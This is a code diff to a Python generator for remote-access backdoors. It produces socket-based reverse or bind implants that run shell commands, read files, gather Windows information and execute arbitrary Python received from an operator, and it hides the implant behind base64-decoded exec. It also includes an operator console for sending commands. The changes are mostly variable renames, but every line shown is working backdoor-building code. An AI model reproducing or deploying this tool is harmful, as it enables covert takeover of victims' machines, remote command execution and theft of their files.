@@ -17,7 +17,7 @@ def Shell(cmd:str) -> None:
     return out
 ""","""
             %s cmd[0]=="shell" and len(cmd)!=1:
-                socket.send(Shell(cmd[1]).encode())
+                controlled_socket.send(Shell(cmd[1]).encode())
 """
     ],"get":[
 """
@@ -47,7 +47,7 @@ def Get(filename:str) -> None:
     return out
 ""","""
             %s cmd[0]=="get" and len(cmd)!=1:
-                socket.send(Get(cmd[1]).encode())
+                controlled_socket.send(Get(cmd[1]).encode())
 """
     ],"win":[
 """
@@ -68,7 +68,7 @@ def Win() -> None:
     return out
 ""","""
             %s cmd[0]=="win" and len(cmd)==1:
-                socket.send(Win().encode())
+                controlled_socket.send(Win().encode())
 """
     ],"py":[
 "",
@@ -80,12 +80,12 @@ def Win() -> None:
                     out = "Command execution succeeded"
                 except:
                     out = "Command execution failed"
-                socket.send(out.encode())
+                controlled_socket.send(out.encode())
 """
     ]
 }
 
-def generate(i:int,src:str,ip_port:tuple([str,int]),parameters:list[str]) -> None:
+def generate(i:int,src:str,ip:str,port:int,parameters:list[str]) -> None:
     controlled_code = "import socket"
     
     if i == 0:
@@ -94,18 +94,18 @@ def generate(i:int,src:str,ip_port:tuple([str,int]),parameters:list[str]) -> Non
                 controlled_code += controlled_codes[parameter][j]
         controlled_code += f"""
 if "__main__" == __name__:
-    socket = socket.socket()
+    controlled_socket = socket.socket()
     try:
-        socket.connect({str(ip_port)})
+        controlled_socket.connect(("{ip}",{str(port)}))
         while True:
-            cmd = socket.recv(2048).decode().split(" ",1)
+            cmd = controlled_socket.recv(2048).decode().split(" ",1)
         """
         controlled_code += controlled_codes[parameters[0]][2] % "if"
         for parameter in parameters[1:len(parameters)]:
             controlled_code += controlled_codes[parameter][2] % "elif"
         controlled_code += """
             else:
-               socket.send("You entered a command or parameter incorrectly".encode())
+               controlled_socket.send("You entered a command or parameter incorrectly".encode())
     except:
         exit(0)   
         """
@@ -116,20 +116,20 @@ if "__main__" == __name__:
                 controlled_code += controlled_codes[parameter][j]
         controlled_code += f"""
 if "__main__" == __name__:
-    socket1 = socket.socket()
-    socket1.bind({str(ip_port)})
-    socket1.listen()
+    controlled_socket = socket.socket()
+    controlled_socket.bind(("{ip}",{str(port)}))
+    controlled_socket.listen()
     try:
-        socket,addr = socket1.accept()
+        control_socket,addr = controlled_socket.accept()
         while True:
-            cmd = socket.recv(2048).decode().split(" ",1)
+            cmd = control_socket.recv(2048).decode().split(" ",1)
         """
         controlled_code += controlled_codes[parameters[0]][2] % "if"
         for parameter in parameters[1:len(parameters)]:
             controlled_code += controlled_codes[parameter][2] % "elif"
         controlled_code += """
             else:
-               socket.send("You entered a command or parameter incorrectly".encode()) 
+               control_socket.send("You entered a command or parameter incorrectly".encode()) 
     except:
         exit(0)   
         """
@@ -143,41 +143,42 @@ exec(base64.b64decode({base64.b64encode(controlled_code.encode())}))
 
 class Control:
     
-    def __init__(self,ip_port:tuple([str,int])) -> None:
-        self.socket = socket.socket()
-        self.ip_port = ip_port
+    def __init__(self,ip:str,port:int) -> None:
+        self.control_socket = socket.socket()
+        self.ip = ip
+        self.port = port
 
     def connect(self) -> None:
         try:
-            self.socket.connect(self.ip_port)
+            self.control_socket.connect((self.ip,self.port))
             while True:
-                cmd = input(f"{self.ip_port[0]} $>")
+                cmd = input(f"{self.ip} $>")
                 if cmd == "":
                     print("Don't send empty cmd!")
                 else:
-                    self.socket.send(cmd.encode())
-                    out = self.socket.recv(2048).decode()
+                    self.control_socket.send(cmd.encode())
+                    out = self.control_socket.recv(2048).decode()
                     print(out)
         except:
             print("controlled close!")
-            self.socket.close()
+            self.control_socket.close()
 
     def listen(self) -> None:
         try:
-            self.socket.bind(self.ip_port)
-            self.socket.listen()
-            print(f"Listening port {self.ip_port[1]}")
-            controlled,addr = self.socket.accept()
+            self.control_socket.bind((self.ip,self.port))
+            self.control_socket.listen()
+            print(f"Listening port {self.port}")
+            controlled_socket,addr = self.control_socket.accept()
             while True:
                 cmd = input(f"{addr[0]} $>")
                 if cmd == "":
                     print("Don't send empty cmd!")
                 else:
-                    controlled.send(cmd.encode())
-                    out = controlled.recv(2048).decode()
+                    controlled_socket.send(cmd.encode())
+                    out = controlled_socket.recv(2048).decode()
                     print(out)
         except:
             print("controlled close!")
-            self.socket.close()
+            self.control_socket.close()
 
             
